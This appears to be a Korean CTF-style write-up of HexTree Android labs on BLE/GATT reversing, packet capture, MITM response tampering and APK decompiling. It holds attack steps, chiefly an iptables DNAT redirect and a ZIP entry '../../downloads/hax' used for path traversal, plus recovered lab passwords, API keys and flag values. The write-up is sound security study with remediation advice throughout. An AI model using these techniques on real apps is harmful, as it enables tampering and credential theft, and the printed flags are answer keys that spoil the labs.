BLE에서는 보통 스마트폰 앱이 central 역할을 하고, 센서나 IoT 장치가 peripheral 역할을 한다. Android 문서는 central이 advertisement를 scan하고, peripheral이 advertise하며 연결을 기다린다고 설명한다. 연결 이후에는 앱이 GATT client가 되어 peripheral의 GATT server에 요청을 보내는 구조가 일반적이다. [Android Developers: Bluetooth Low Energy](https://developer.android.com/develop/connectivity/bluetooth/ble/ble-overview)

```text
Android app
  -> BLE central
  -> GATT client

BLE device
  -> BLE peripheral
  -> GATT server
```

#### GATT, Service, Characteristic, Descriptor

GATT(Generic Attribute Profile)는 BLE에서 짧은 데이터 조각인 attribute를 주고받기 위한 구조다. Android 문서는 GATT가 service와 characteristic 기반으로 데이터를 전송한다고 설명한다. [Android Developers: Bluetooth Low Energy](https://developer.android.com/develop/connectivity/bluetooth/ble/ble-overview)

계층 구조는 다음과 같이 보면 된다.

```text
GATT server
└── Service UUID
    └── Characteristic UUID
        └── Descriptor UUID
```

- Service: 기능 묶음. 예: 배터리, 심박, 기기 정보, 커스텀 제어 기능
- Characteristic: 실제 읽고 쓰는 값
- Descriptor: characteristic의 부가 정보 또는 notification 설정

Bluetooth SIG의 BLE primer도 GATT가 service, characteristic, descriptor라는 상위 데이터 타입을 정의한다고 설명한다. [Bluetooth SIG: Bluetooth LE primer](https://www.bluetooth.com/bluetooth-le-primer/)

#### Characteristic property

BLE reversing에서 가장 먼저 봐야 하는 값은 characteristic property다.

```text
READ      앱이 값을 읽을 수 있음
WRITE     앱이 값을 쓸 수 있음
NOTIFY    기기가 값을 비동기로 보낼 수 있음
INDICATE  notify와 유사하지만 확인 응답이 붙음
```

보안 분석에서는 `WRITE` 가능한 characteristic을 특히 본다. 앱이 특정 byte sequence, JSON, base64, protobuf, checksum이 붙은 command를 write하고 있다면 그 characteristic이 기기 제어 API일 가능성이 높다.

#### Android Bluetooth permission

Android 12(API 31) 이상에서는 Bluetooth 동작별 권한이 분리된다. 공식 문서 기준으로 BLE scan에는 `BLUETOOTH_SCAN`, advertise에는 `BLUETOOTH_ADVERTISE`, 이미 paired된 기기와 통신하려면 `BLUETOOTH_CONNECT`가 필요하다. 이 권한들은 runtime permission이므로 사용자 승인이 필요하다. [Android Developers: Bluetooth permissions](https://developer.android.com/develop/connectivity/bluetooth/bt-permissions)

Manifest에서 확인할 대표 항목:

```xml
<uses-permission android:name="android.permission.BLUETOOTH_SCAN" />
<uses-permission android:name="android.permission.BLUETOOTH_CONNECT" />
<uses-permission android:name="android.permission.BLUETOOTH_ADVERTISE" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
```

Android 11 이하에서는 BLE scan 결과가 사용자 위치 추론에 쓰일 수 있어서 위치 권한이 관련된다. Android 12 이상에서도 scan 결과로 위치를 추론하지 않는다고 강하게 주장할 수 있으면 `neverForLocation` 같은 선언을 고려할 수 있다. [Android Developers: Bluetooth permissions](https://developer.android.com/develop/connectivity/bluetooth/bt-permissions)

### 4. 분석 절차

#### 1) Manifest에서 권한 확인

```powershell
aapt dump xmltree base.apk AndroidManifest.xml
```

확인 키워드:

```text
BLUETOOTH
BLUETOOTH_ADMIN
BLUETOOTH_SCAN
BLUETOOTH_CONNECT
BLUETOOTH_ADVERTISE
ACCESS_FINE_LOCATION
uses-feature android.hardware.bluetooth_le
```

#### 2) 코드에서 Bluetooth API 호출 찾기

정적 분석에서는 다음 키워드를 우선 검색한다.

```text
BluetoothAdapter
BluetoothLeScanner
ScanCallback
BluetoothDevice
connectGatt
BluetoothGatt
BluetoothGattCallback
discoverServices
getServices
getCharacteristic
readCharacteristic
writeCharacteristic
setCharacteristicNotification
BluetoothGattDescriptor
```

Android `BluetoothGatt` 문서는 GATT 기능을 제공하는 public API이며, 연결된 remote device에서 service 목록 조회, characteristic read, descriptor read 등을 수행할 수 있다고 설명한다. [Android Developers: BluetoothGatt](https://developer.android.com/reference/android/bluetooth/BluetoothGatt)

#### 3) UUID 매핑

BLE reversing의 핵심 산출물은 UUID map이다.

```text
Service UUID: <uuid>
  Characteristic UUID: <uuid>
    Property: READ / WRITE / NOTIFY
    의미 추정: 인증 토큰, 상태 조회, 명령 전송, 로그 수신 등
```

앱 코드에서 UUID가 다음처럼 hardcoded되어 있으면 바로 후보로 기록한다.

```java
UUID.fromString("0000xxxx-0000-1000-8000-00805f9b34fb");
```

16-bit Bluetooth SIG assigned UUID인지, vendor-specific 128-bit UUID인지 구분한다. 표준 UUID는 기능 추정이 쉽고, 128-bit custom UUID는 앱 코드와 트래픽을 같이 봐야 의미를 알 수 있다.

#### 4) read/write/notify 흐름 추적

앱이 characteristic에 쓰는 값이 실제 프로토콜이다.

```text
버튼 클릭
  -> command object 생성
  -> byte[] 변환
  -> checksum/encryption/encoding
  -> writeCharacteristic()
```

반대로 기기에서 오는 값은 `onCharacteristicChanged()` 또는 read callback에서 처리된다.

```text
notification 수신
  -> byte[] decode
  -> 상태값 파싱
  -> UI 갱신 또는 내부 상태 변경
```

이 흐름을 따라가면 앱이 기기에게 보내는 명령어, 인증 단계, 상태 동기화 프로토콜을 복원할 수 있다.

### 5. 보안 관점

BLE 통신에서 자주 보는 취약 패턴은 다음이다.

- 인증 없이 writable characteristic에 명령을 허용
- command 값이 앱에 hardcoded되어 누구나 재전송 가능
- pairing/bonding 없이 민감 데이터 notify
- BLE link-layer 보안에만 의존하고 app-layer 인증이 없음
- nonce나 replay 방지 없이 동일 command 재사용 가능
- firmware/debug characteristic이 production에서도 노출
- UUID를 숨기는 것만으로 보안이라고 가정

Android BLE 문서는 BLE pairing으로 통신한 데이터가 같은 사용자 기기의 모든 앱에서 접근 가능할 수 있으므로, 민감 데이터를 다루면 app-layer security를 구현해야 한다고 주의한다. [Android Developers: Bluetooth Low Energy](https://developer.android.com/develop/connectivity/bluetooth/ble/ble-overview)


이 파일에는 임의 flag 값을 넣지 않는다. 이 트랙은 BLE/GATT 분석 개념을 정리하고, 이후 실제 BLE 앱 또는 IoT companion app 분석 시 사용할 체크리스트로 남긴다.

### 6. 방어 방안

- BLE characteristic 접근 제어를 기기 firmware와 앱 프로토콜 양쪽에서 설계한다.
- writable characteristic에는 app-layer 인증과 권한 검사를 둔다.
- replay 방지를 위해 nonce, timestamp, counter, MAC 등을 사용한다.
- pairing/bonding이 필요한 기능과 공개적으로 읽을 수 있는 기능을 분리한다.
- 민감 데이터는 notify/read로 평문 전송하지 않는다.
- debug/service/test characteristic은 production firmware에서 제거한다.
- 앱 코드에 command secret이나 고정 token을 hardcoded하지 않는다.
- Android 12 이상 권한 모델에 맞춰 `BLUETOOTH_SCAN`, `BLUETOOTH_CONNECT`, `BLUETOOTH_ADVERTISE`를 최소 선언한다.

### 7. 배운 점

- BLE reversing은 APK 분석과 프로토콜 분석이 같이 필요하다.
- UUID 목록만 보는 것이 아니라, 어떤 characteristic에 어떤 byte가 read/write/notify되는지 추적해야 한다.
- GATT service/characteristic 구조를 이해하면 앱 코드에서 프로토콜 의미를 더 빠르게 복원할 수 있다.
- Bluetooth 권한은 앱이 scan/connect할 수 있는지를 제어하지만, 기기 명령 자체의 인증을 대신하지 않는다.
- 민감한 BLE 기능은 link-layer 보안과 별개로 app-layer 보안이 필요하다.

### 참고 자료

1. [HexTree: Bluetooth Reverse Engineering Basics](https://app.hextree.io/courses/android-bluetooth-reversing)
2. [Android Developers: Bluetooth Low Energy](https://developer.android.com/develop/connectivity/bluetooth/ble/ble-overview)
3. [Android Developers: Bluetooth permissions](https://developer.android.com/develop/connectivity/bluetooth/bt-permissions)
4. [Android Developers: BluetoothGatt](https://developer.android.com/reference/android/bluetooth/BluetoothGatt)
5. [Bluetooth SIG: Bluetooth LE primer](https://www.bluetooth.com/bluetooth-le-primer/)


---

## HexTree Android Track — Network Interception

![Network Interception 및 JNI 분석 증적](assets/redacted-flag-evidence-network-jni.svg)

### 실습: Packet Logging with tcpdump

- 과정: Network Interception / Android Networking Basics
- 페이지: <https://app.hextree.io/courses/network-interception/android-networking-basics/packet-logging-with-tcpdump>
- 대상 APK: `pockethexmap.apk`
- 대상 패키지: `io.hextree.pocketmaps`
- 앱 라벨: `PocketHexMaps`
- 목표: PocketHexMap 앱의 HTTP traffic을 분석해 cleartext 통신 여부와 HTTP response 안의 flag를 확인한다.

### 핵심 개념

`tcpdump`나 emulator packet capture는 앱 내부 코드가 아니라 네트워크 경계에서 패킷을 본다. 따라서 앱이 HTTP를 사용하면 요청 URL, Host header, 응답 header, 응답 body가 평문으로 관찰될 수 있다.

Android 공식 문서는 Network Security Configuration을 통해 cleartext traffic opt-out, 신뢰할 CA 제한, debug-only override, certificate pinning 등을 선언적으로 설정할 수 있다고 설명한다. 즉 Android 앱의 네트워크 보안은 코드뿐 아니라 manifest와 network security config도 함께 확인해야 한다. [Android Developers: Network Security Configuration](https://developer.android.com/privacy-and-security/security-config)

OWASP MASTG도 모바일 앱 테스트에서 정적 분석, 동적 분석, 네트워크 통신 분석을 주요 절차로 다룬다. 네트워크 실습에서는 “앱이 어떤 endpoint와 통신하는지”, “민감 데이터가 평문으로 전달되는지”, “TLS/인증서 검증이 적절한지”를 확인한다. [OWASP MASTG](https://mas.owasp.org/MASTG/)

### 분석 절차

#### 1. APK 식별

HexTree 페이지에서 제공된 `pockethexmap.apk`를 다운로드하고 `aapt dump badging`으로 패키지와 권한을 확인했다.

```powershell
aapt.exe dump badging outputs\pockethexmap.apk
```

확인 결과:

```text
package: name='io.hextree.pocketmaps'
application-label:'PocketHexMaps'
launchable-activity: name='io.hextree.pocketmaps.activities.MainActivity'
uses-permission: name='android.permission.INTERNET'
```

`INTERNET` 권한이 있으므로 앱이 외부 네트워크 요청을 수행할 수 있다. Android에서 네트워크 통신은 `android.permission.INTERNET` 권한 선언이 필요하다. [Android Developers: Manifest.permission.INTERNET](https://developer.android.com/reference/android/Manifest.permission#INTERNET)

#### 2. 에뮬레이터 패킷 캡처

HexTree 페이지는 emulator를 `-tcpdump` 옵션으로 시작해 `packets.cap` 파일에 패킷을 저장하는 방식을 설명한다. 현재 환경에서는 실행 중인 emulator console의 capture 기능을 사용했다.

```powershell
adb.exe emu network capture start pockethexmap3.cap
```

주의할 점: 첫 시도에서는 pcap 파일이 24바이트, 즉 pcap 헤더만 생성됐다. HexTree 페이지 설명처럼 Wi-Fi interface traffic이 캡처되지 않는 경우가 있어 Wi‑Fi를 비활성화하고 mobile data 경로로 재시도했다.

```powershell
adb.exe shell svc wifi disable
adb.exe shell svc data enable
```

그 뒤 PocketHexMaps 앱을 실행하고 권한 안내 화면을 통과했다.

```powershell
adb.exe shell am start -n io.hextree.pocketmaps/io.hextree.pocketmaps.activities.MainActivity
```

#### 3. HTTP response 확인

다운로드 목록 화면으로 진입하자 앱은 map list JSON을 HTTP로 가져왔다. pcap에서 확인된 요청은 다음과 같다.

```http
GET /ht-labs-dev-static-files/pocketmaps/maps/map_url-0.13.0_0.json HTTP/1.1
Host: storage.googleapis.com
```

응답은 `Content-Type: application/json`이었고, JSON body 안에 `hextree-flag` 필드가 포함되어 있었다.

```json
{
  "hextree-flag": "HXT{...}",
  "maps-0.13.0_0": "..."
}
```

분석 관점에서 중요한 점은 flag 값 자체보다 “HTTP 응답 body가 암호화되지 않은 상태로 pcap에서 바로 확인됐다”는 사실이다. 이 구조에서는 같은 네트워크 경로의 관찰자가 응답에 포함된 민감 데이터를 읽을 수 있다.

#### 4. 추가 확인: 지도 파일 다운로드

지도 항목 중 `Nauru`를 선택하자 다음 HTTP 요청도 관찰됐다.

```http
GET /ht-labs-dev-static-files/pocketmaps/maps/maps/2024-02/australia-oceania_nauru.ghz?v=4.0 HTTP/1.1
Host: storage.googleapis.com
```

응답은 `Content-Type: application/octet-stream`이고 `Content-Length: 510798`인 바이너리 지도 파일이었다. 이 응답 자체에는 flag 문자열이 없었고, flag는 map list JSON 응답에 있었다.

### 취약점 원인

원인은 앱이 지도 목록 JSON을 HTTPS가 아니라 HTTP cleartext로 받아온 것이다. HTTP는 transport encryption을 제공하지 않기 때문에 요청/응답이 네트워크 캡처에서 그대로 보인다.

이 실습에서는 교육용 flag가 노출됐지만, 실제 앱이라면 다음 정보가 노출될 수 있다.

- API endpoint 구조
- 다운로드 가능한 리소스 경로
- 앱 설정 값
- 사용자별 token 또는 identifier
- feature flag 또는 내부 운영 데이터

### 개선 방향

- API와 정적 리소스 다운로드에 HTTPS를 사용한다.
- `android:usesCleartextTraffic="false"` 또는 Network Security Configuration으로 cleartext traffic을 명시적으로 차단한다.
- 민감 데이터는 응답 body에 넣기 전에 필요한 최소 범위로 줄인다.
- public object storage를 쓰더라도 bucket/object path에 민감한 의미를 담지 않는다.
- 앱 릴리스 빌드에서 debug endpoint와 lab/test endpoint가 남아 있지 않은지 확인한다.

### 결과

- HTTP map list 요청 확인
- JSON response body에서 HexTree flag 필드 확인
- 지도 파일 다운로드 응답은 별도 바이너리였고 flag는 포함하지 않음
- 제출용 flag는 별도 보관하고 블로그용 write-up에는 원문 전체를 노출하지 않음

### 실습: 사례 연구: PocketHexMap - 정적·동적 분석

- 과정: Network Interception / Case Study: PocketHexMap
- 페이지: <https://app.hextree.io/courses/network-interception/case-study-pockethexmap/static-vs-dynamic-analysis>
- 목표: MITM 관점에서 네트워크 응답만 조작해 `/data/media/0/Android/data/io.hextree.pocketmaps/files/Download/pocketmaps/downloads/hax` 파일을 생성한다.

이 랩은 앱의 파일시스템을 직접 건드리는 문제가 아니라, 앱이 내려받는 archive의 내용을 변조해 압축 해제 경로를 우회하는 문제다. 따라서 핵심은 `HTTP response manipulation`과 `ZIP path traversal`이다.

#### 1. 동적 HTTP 응답 가로채기

처음에는 에뮬레이터 전역 프록시와 hosts 변경을 시도했지만, 지도 파일 다운로드는 앱 프로세스가 아니라 Android `DownloadManager`가 수행했다. 이 시스템 프로세스 트래픽은 해당 프록시 설정을 따르지 않았다. 따라서 root shell에서 `OUTPUT` 체인에 DNAT 규칙을 추가해 TCP/80 트래픽을 로컬 MITM 서버로 강제했다.

```powershell
adb shell iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 10.0.2.2:8080
python tools/fake_map_server.py
```

이후 앱은 지도 목록 JSON을 요청하고, 로컬 서버는 `Nauru` 항목과 조작된 `.ghz` 응답을 반환했다.

```http
GET /ht-labs-dev-static-files/pocketmaps/maps/map_url-0.13.0_0.json HTTP/1.1
Host: storage.googleapis.com
```

프록시는 이 요청에 대해 수정된 JSON을 반환했다. 목적은 앱이 우리가 선택한 지도 파일을 다운로드하도록 만드는 것이다.

#### 2. 악성 `.ghz` archive 반환

지도 파일 요청이 오면 정상 파일 대신 path traversal 엔트리를 가진 ZIP archive를 반환했다.

```http
GET /ht-labs-dev-static-files/pocketmaps/maps/maps/2024-02/australia-oceania_nauru.ghz?v=4.0 HTTP/1.1
Host: storage.googleapis.com
```

압축 파일 내부에는 다음과 같은 엔트리를 넣었다.

```text
../../downloads/hax
```

앱 로그에서 실제로 다음 경로가 사용된 것을 확인했다.

```text
extract file path: /storage/emulated/0/Android/data/io.hextree.pocketmaps/files/Download/pocketmaps/maps/australia-oceania_nauru-gh/../../downloads/hax
```

이 값은 정규화되면 문제에서 요구한 다운로드 폴더의 `hax` 경로로 이어진다. 결국 앱은 네트워크에서 받은 archive를 풀면서 `hax` 파일을 생성하게 된다.

#### 3. 확인된 결과

- map list JSON은 프록시로 변조 가능했다.
- `.ghz` archive는 네트워크 응답만으로 교체 가능했다.
- 앱 로그에서 `extract file path`가 `../../downloads/hax`를 포함하는 것을 확인했다.
- 따라서 조건상 “use network interception only”를 만족한다.

#### 4. 검증 결과와 플래그

에뮬레이터에서 다음 파일이 실제로 생성된 것을 확인했다.

```text
/sdcard/Android/data/io.hextree.pocketmaps/files/Download/pocketmaps/downloads/hax
```

파일 내용은 MITM archive entry가 제공한 다음 문자열이었다.

```text
pwned by MITM zip path traversal
```

앱은 이 파일을 감지한 뒤 난독화된 flag를 Toast로 한 번만 표시한다. Toast 지속 시간이 짧아 `Toast.makeText()`를 Frida로 hook하여 값을 확인했다.

```text
HXT{zip-path-traversal-1sg17}
```

핵심 원인은 실제 압축 해제 경로가 `ZipEntry.getName()`을 base directory 문자열에 그대로 연결하고, `getCanonicalPath()` 기반의 경로 경계 검증을 하지 않은 점이다. GraphHopper의 안전한 `Unzipper` 구현이 APK에 함께 있더라도, 실제 다운로드 처리에는 이 검증 없는 코드 경로가 사용됐다.

### 참고 자료

1. [HexTree: Packet Logging with tcpdump](https://app.hextree.io/courses/network-interception/android-networking-basics/packet-logging-with-tcpdump)
2. [Android Developers: Network Security Configuration](https://developer.android.com/privacy-and-security/security-config)
3. [Android Developers: Manifest.permission.INTERNET](https://developer.android.com/reference/android/Manifest.permission#INTERNET)
4. [OWASP MASTG](https://mas.owasp.org/MASTG/)
5. [HexTree: Static vs. Dynamic Analysis](https://app.hextree.io/courses/network-interception/case-study-pockethexmap/static-vs-dynamic-analysis)


---

## Android 앱 리버스 엔지니어링 — apktool로 APK 추출

**Lab:** [apktool로 APK 추출 (Extracting APKs with apktool)](https://app.hextree.io/courses/reverse-android-apps/working-with-apks-and-apktool/extracting-apks-with-apktool)  
**APK:** `io.hextree.reversingexample.apk`  
**패키지:** `io.hextree.reversingexample`

### 목표

런처에서 접근할 수 없는 Activity를 찾아 직접 실행한다.

### 정적 분석

원래 의도된 추출 명령은 다음과 같다.

```powershell
apktool d io.hextree.reversingexample.apk -o reversingexample-decoded
```

로컬 환경에는 APKTool이 설치되지 않아 Android SDK의 `aapt`로 컴파일된 Manifest를 직접 확인했다. component 탐색 단계에는 이것만으로 충분하다.

```powershell
aapt dump xmltree io.hextree.reversingexample.apk AndroidManifest.xml
```

Manifest에는 다음과 같은 비-런처 component가 있었다.

```text
io.hextree.reversingexample.SecretActivity
android:exported=true
```

`MainActivity`는 launcher 진입점이고, `SecretActivity`에는 `MAIN`/`LAUNCHER` filter가 없으므로 일반 앱 런처에 표시되지 않는다.

### 동적 검증

랩 APK를 설치한 뒤 ADB로 명시적 component를 실행했다.

```powershell
adb -s emulator-5554 install -r .\io.hextree.reversingexample.apk
adb -s emulator-5554 shell am start -n io.hextree.reversingexample/.SecretActivity
```

Activity에 표시된 값은 다음과 같다.

```text
HXT{A-not-so-secret-activity}
```

### 배운 점

앱 UI에 보이지 않는 component가 반드시 접근 불가능한 것은 아니다. Manifest는 launcher보다 더 완전한 component 목록을 제공하며, exported Activity는 explicit intent로 지정할 수 있다. APKTool은 보통 디코드된 Manifest와 smali 코드를 제공하고, Manifest metadata만 필요할 때는 `aapt dump xmltree`가 읽기 전용 대안이 된다.

### apktool로 APK 수정 및 재패키징

**Lab:** [apktool로 APK 수정 및 재패키징 (Patching and re-packing APKs with apktool)](https://app.hextree.io/courses/reverse-android-apps/working-with-apks-and-apktool/patching-and-re-packing-apks-with-apktoo)

#### 수정

디코드한 Manifest에는 처음에 `android:exported="false"`로 지정된 `UnreachableActivity`가 있다.

```xml
<activity android:exported="false"
    android:name="io.hextree.reversingexample.UnreachableActivity" />
```

이 속성만 다음과 같이 변경했다.

```xml
<activity android:exported="true"
    android:name="io.hextree.reversingexample.UnreachableActivity" />
```

#### 빌드, align 및 서명

APKTool 3.0.3으로 APK를 디코드하고 다시 빌드했다. 설치 전에 Android Build Tools로 결과 APK를 align하고 서명했다.

```powershell
java -jar apktool_3.0.3.jar d io.hextree.reversingexample.apk -o reversingexample-decoded
java -jar apktool_3.0.3.jar b reversingexample-decoded -o reversingexample-patched-unsigned.apk
zipalign -p -f -v 4 reversingexample-patched-unsigned.apk reversingexample-patched-aligned.apk
apksigner sign --ks research-lab.keystore --ks-key-alias research_key `
  --out reversingexample-patched.apk reversingexample-patched-aligned.apk
apksigner verify --verbose reversingexample-patched.apk
```

서명 검증 결과는 유효한 v3 서명을 보고했다. 수정 APK는 원본 package와 다른 교육용 keystore를 사용했으므로, 수정본 설치 전에 에뮬레이터에서 원본 랩 앱을 제거했다.

```powershell
adb -s emulator-5554 uninstall io.hextree.reversingexample
adb -s emulator-5554 install reversingexample-patched.apk
adb -s emulator-5554 shell am start -n io.hextree.reversingexample/.UnreachableActivity
```

Activity가 열리며 다음 값이 표시됐다.

```text
HXT{I-thought-I-am-unreachable}
```

**플래그:** `HXT{I-thought-I-am-unreachable}`

#### 배운 점

`android:exported`는 다른 애플리케이션(ADB가 사용하는 shell 호출자 포함)이 component를 지정할 수 있는지 제어한다. 재패키징하면 서명 identity가 바뀌므로 Android는 다른 key로 서명한 in-place update를 거부한다. 따라서 기존 설치본을 제거하거나, 원래 서명 key로 다시 빌드해야 한다.

### jadx 시작하기

**Lab:** [jadx 시작하기 (Getting started with jadx)](https://app.hextree.io/courses/reverse-android-apps/decompiling-android-applications/getting-started-with-jadx)

#### 코드 경로

launcher `MainActivity`는 입력값을 가져와 `SecretKeeper.getSecretPassword()`의 반환값과 비교한다. 복원된 메서드는 문자열을 직접 반환한다.

```java
public static String getSecretPassword() {
    return "iAmHardcoded";
}
```

이 환경에서는 CLI 대안으로 원본 APK의 smali를 사용했다. JADX GUI에서는 `AndroidManifest.xml`을 열고 `MainActivity`, 이어서 `SecretKeeper.getSecretPassword()` 호출을 따라가면 동일한 경로에 도달한다.

#### 동적 검증

launcher 비밀번호 화면에 `iAmHardcoded`를 입력하면 다음 페이지로 이동하고, 앱은 다음 제출 플래그를 표시한다.

```text
HXT{hardcoded-secrets-are-bad}
```

**비밀번호:** `iAmHardcoded`  
**플래그:** `HXT{hardcoded-secrets-are-bad}`

#### 배운 점

클라이언트 코드에 포함한 인증 비밀값은 정적 분석으로 복구할 수 있다. 비교 로직을 로컬 helper class로 옮겨도 보호되지 않는다. 값은 여전히 APK에 포함되며, source decompilation 또는 bytecode inspection으로 복구할 수 있다.

### 문자열 Resource 해석

**Lab:** [문자열 Resource 해석 (Resolving string Resources)](https://app.hextree.io/courses/reverse-android-apps/decompiling-android-applications/resolving-string-resources)

#### 리소스 값 해석

`LoggedInActivity`의 비밀번호 검사는 리터럴 값을 직접 포함하지 않는다. 대신 click handler가 `getString()`으로 `R.string.secret2`를 읽고, 그 결과를 사용자가 입력한 text와 비교한다.

```java
String expected = getString(R.string.secret2);
if (passwordText.equals(expected)) {
    startActivity(new Intent(this, SecondPasswordActivity.class));
}
```

해당 resource symbol을 디코드된 `res/values/strings.xml` 파일까지 따라가 값의 정체를 확인했다.

```xml
<string name="secret2">VeryResourcefulSecret</string>
```

#### 동적 검증

두 번째 비밀번호 입력란에 `VeryResourcefulSecret`를 넣으면 다음 화면이 열리고 다음 값이 표시된다.

```text
HXT{resources-are-no-match-for-me}
```

**비밀번호:** `VeryResourcefulSecret`  
**플래그:** `HXT{resources-are-no-match-for-me}`

#### 배운 점

클라이언트 측 비밀값을 Android string resource에 넣는 것은 코드 정리에는 도움이 되지만 비밀성을 만들지는 않는다. `R.string.secret2` 같은 resource identifier는 컴파일된 resource 또는 디코드된 XML까지 따라갈 수 있으므로, 인증이나 인가의 신뢰 경계로 사용하면 안 된다.

### JNI(Java Native Interface)

**Lab:** [JNI - Java Native Interface](https://app.hextree.io/courses/reverse-android-apps/decompiling-android-applications/jni-java-native-interface)

#### 네이티브 호출 경로

`SecondPasswordActivity`는 `NativeLib`를 생성하고 사용자가 입력한 text를 `secretFromJNI()`의 반환값과 비교한다. Java 선언에는 `native`가 붙어 있고, class initializer는 `example_nativelib` shared library를 불러온다.

```java
static {
    System.loadLibrary("example_nativelib");
}

public native String secretFromJNI();
```

대응하는 native object는 `lib/x86_64/libexample_nativelib.so`다. printable string을 추출하면 JNI export name과 비밀값을 모두 찾을 수 있다.

```text
Java_io_hextree_example_1nativelib_NativeLib_secretFromJNI
nativeSecretsCanBeFoundToo
```

#### 동적 검증

세 번째 비밀번호 입력란에 `nativeSecretsCanBeFoundToo`를 넣으면 마지막 화면이 열리고 다음 값이 표시된다.

```text
HXT{from-java-to-native}
```

**비밀번호:** `nativeSecretsCanBeFoundToo`  
**플래그:** `HXT{from-java-to-native}`

#### 배운 점

JNI는 로직을 native `.so` 파일로 옮기지만, hard-coded 값을 자동으로 보호하지는 않는다. 비밀값이 패키징된 native library에 printable string으로 남아 있으면 기본적인 string extraction만으로도 복구된다. 따라서 native 구현 자체가 인증 경계가 될 수는 없다.

### 사례 연구: Hextree Weather App

**Lab:** [Hextree Weather App](https://app.hextree.io/courses/reverse-android-apps/case-study-a-weather-app/the-hextree-weather-app)

#### 인증값

제공된 APK는 별도 package인 `io.hextree.weatherusa`다. 이를 디코드하면 application resource 파일 `res/values/strings.xml`에 `ApiKey`라는 값이 들어 있다.

```xml
<string name="ApiKey">HXT{android-api-key-b1872g}</string>
```

랩은 application이 weather API 인증에 사용하는 값을 요구하므로, 이 resource가 제출값이다.

**플래그:** `HXT{android-api-key-b1872g}`

#### 배운 점

API credential를 APK에 넣으면 앱을 입수한 누구나 복구할 수 있다. resource identifier는 코드를 정리하는 데는 유용하지만 secret storage가 아니다. 복구된 client value가 광범위하게 재사용 가능한 credential로 작동하지 않도록 API authorization을 설계해야 한다.

### 사례 연구: API 요청 리버스 엔지니어링

**Lab:** [API 요청 리버스 엔지니어링 (Reverse Engineering the API Request)](https://app.hextree.io/courses/reverse-android-apps/case-study-a-weather-app/reverse-engineering-the-api-request)

#### 요청 재구성

weather worker는 다음 endpoint로 `GET` 요청을 구성한다.

```text
https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/xml/SOAP_server/ndfdXMLclient.php
```

요청에는 `whichClient=NDFDgen`, `zipCodeList` parameter, forecast option, `User-Agent: HextreeForecastUSA/v4.x` header, 그리고 앞선 랩에서 찾은 `ApiKey` resource 값을 사용하는 `X-API-KEY` header가 포함된다.

`MainActivity`의 update gate는 `13337`과 `42` 두 값을 수용한다. 하지만 location Activity는 다섯 글자가 입력되어야만 Done button을 활성화한다. 따라서 update gate가 수용하는 더 짧은 값 `42`는 일반 ZIP-code UI로는 사용할 수 없다.

#### 수동 API 요청

`zipCodeList=42`, 같은 User-Agent, 복구한 API key로 앱의 요청을 재현했다. 반환된 weather XML에는 다음 condition text가 들어 있었다.

```text
HXT{android-api-h192gsa0}
```

**플래그:** `HXT{android-api-h192gsa0}`

#### 배운 점

클라이언트 측 UI validation은 access control boundary가 아니다. 수동 요청은 앱의 이후 로직은 수용하지만 보이는 input control은 막는 parameter 값을 사용할 수 있다. 민감한 server 동작은 Android client와 독립적으로 의도한 validation을 강제해야 한다.

### 사례 연구: 앱 업데이트 diff 분석

**Lab:** [앱 업데이트 diff 분석 (Diffing Application Updates)](https://app.hextree.io/courses/reverse-android-apps/case-study-a-weather-app/diffing-application-updates)

#### 두 APK 비교

원본 Weather APK와 제공된 `update1` APK를 각각 다른 directory에 디코드한 뒤 내용을 비교했다. update는 `InternetUtil`과 ABI별 `libnative-lib.so` library를 추가한다. 이는 바뀌지 않은 모든 smali 파일을 검토하는 것보다 훨씬 유용한 신호다.

`InternetUtil`은 `X-API-KEY` header를 설정하지만 최종값을 일반 Java string으로 포함하지는 않는다. 대신 다음 seed를 private native method에 전달한다.

```text
moiba1cybar8smart4sheriff4securi
```

```java
private static native String getKey(String seed);
```

#### 로컬 JNI 검증

`libnative-lib.so`의 readable string은 JNI export name은 보여 주지만 반환 key는 보여 주지 않는다. weather request를 보내지 않고 결과를 관찰하기 위해, 별도 package name으로 로컬 서명한 분석용 copy를 만들었다. 이 copy의 `onCreate()`는 `getKey()`를 한 번 호출해 반환값만 log에 남기고, 원래 activity 초기화와 networking code가 실행되기 전에 반환한다.

filtering한 로컬 Logcat 항목은 다음과 같다.

```text
E HXT-NATIVE-KEY: HXT{obfuscated-api-key-asb126us}
```

**플래그:** `HXT{obfuscated-api-key-asb126us}`

#### 배운 점

credential 변환을 JNI로 옮기면 단순 resource 또는 string search로 최종값을 찾는 일은 어려워지지만, client가 보유한 secret이 접근 불가능해지는 것은 아니다. 분석가는 release를 비교해 새 code path를 좁힌 뒤, 통제된 로컬 build에서 native method의 output을 관찰할 수 있다. server access를 부여하는 secret은 client-side obfuscation에만 의존해서는 안 된다.

### 참고 자료

- [HexTree 랩: apktool로 APK 추출](https://app.hextree.io/courses/reverse-android-apps/working-with-apks-and-apktool/extracting-apks-with-apktool)
- [HexTree 랩: apktool로 APK 수정 및 재패키징](https://app.hextree.io/courses/reverse-android-apps/working-with-apks-and-apktool/patching-and-re-packing-apks-with-apktoo)
- [HexTree 랩: jadx 시작하기](https://app.hextree.io/courses/reverse-android-apps/decompiling-android-applications/getting-started-with-jadx)
- [HexTree 랩: 문자열 Resource 해석](https://app.hextree.io/courses/reverse-android-apps/decompiling-android-applications/resolving-string-resources)
- [HexTree 랩: JNI - Java Native Interface](https://app.hextree.io/courses/reverse-android-apps/decompiling-android-applications/jni-java-native-interface)
- [HexTree 랩: Hextree Weather App](https://app.hextree.io/courses/reverse-android-apps/case-study-a-weather-app/the-hextree-weather-app)
- [HexTree 랩: API 요청 리버스 엔지니어링](https://app.hextree.io/courses/reverse-android-apps/case-study-a-weather-app/reverse-engineering-the-api-request)
- [HexTree 랩: 앱 업데이트 diff 분석](https://app.hextree.io/courses/reverse-android-apps/case-study-a-weather-app/diffing-application-updates)
- [Apktool 문서](https://apktool.org/docs/)
- [Android Developers: `aapt2` 및 APK resource inspection](https://developer.android.com/tools/aapt2)
- [Android Developers: `apksigner`](https://developer.android.com/tools/apksigner)


---

## HexTree Android 동적 계측 보고서

![가림 처리한 Frida Java.perform 분석 증적](assets/redacted-flag-evidence-frida.svg)

> 그림 2. `FlagClass`의 static/instance 메서드를 대상으로 한 가림 처리된 Frida 증적이다. 공개 글에서는 플래그의 전체값 대신 호출 방식과 필요한 입력값을 남겼다.

### Frida 기초: 정적·동적 분석 결합과 `Java.perform`

